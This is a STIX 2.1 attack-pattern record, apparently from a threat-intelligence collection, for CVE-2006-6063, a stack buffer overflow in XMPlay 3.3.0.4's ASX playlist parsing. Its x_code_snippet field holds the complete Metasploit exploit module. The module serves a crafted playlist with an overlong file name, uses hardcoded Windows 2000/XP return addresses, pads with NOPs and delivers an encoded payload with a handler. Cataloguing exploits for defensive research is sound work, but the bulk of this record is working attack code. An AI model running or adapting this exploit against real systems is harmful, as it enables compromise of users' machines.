{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d80456d-6574-42dc-ab5d-775a36994565",
    "created": "2024-08-14T16:42:38.12452Z",
    "modified": "2024-08-14T16:42:38.124524Z",
    "name": "XMPlay 3.3.0.4 (ASX Filename) Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in XMPlay 3.3.0.4. The vulnerability is caused due to a boundary error within the parsing of playlists containing an overly long file name. This module uses the ASX file format.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/xmplay_asx.rb",
            "external_id": "xmplay_asx.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6063"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20070502134818/http://secunia.com:80/advisories/22999"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'XMPlay 3.3.0.4 (ASX Filename) Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in XMPlay 3.3.0.4.\n        The vulnerability is caused due to a boundary error within\n        the parsing of playlists containing an overly long file name.\n        This module uses the ASX file format.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '2006-6063'],\n          [ 'OSVDB', '30537'],\n          [ 'BID', '21206'],\n          [ 'URL', 'http://web.archive.org/web/20070502134818/http://secunia.com:80/advisories/22999' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows 2000 Pro English SP4',\t\t{ 'Ret' => 0x77e14c29 } ],\n          [ 'Windows XP Pro SP2 English',\t\t\t{ 'Ret' => 0x77dc15c0 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-11-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    drv\t=  rand_text_alpha_upper(1)\n    ext\t=  rand_text_alpha_upper(3)\n\n    sploit =  rand_text_alpha_upper(498) + [ target.ret ].pack('V')\n    sploit << make_nops(40) + payload.encoded\n\n    # Build the stream format\n    content =  \"<ASX VERSION=\\\"3\\\">\\r\\n\" + \"<ENTRY>\\r\\n\"\n    content << \"<REF HREF=\\\"file://#{drv}:\\\\\" + sploit\n    content << \".\" + \"#{ext}\\\"\\r\\n\" + \"</ENTRY>\\r\\n\" + \"</ASX>\\r\\n\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-21",
    "x_mitre_platforms": [
        "win'"
    ]
}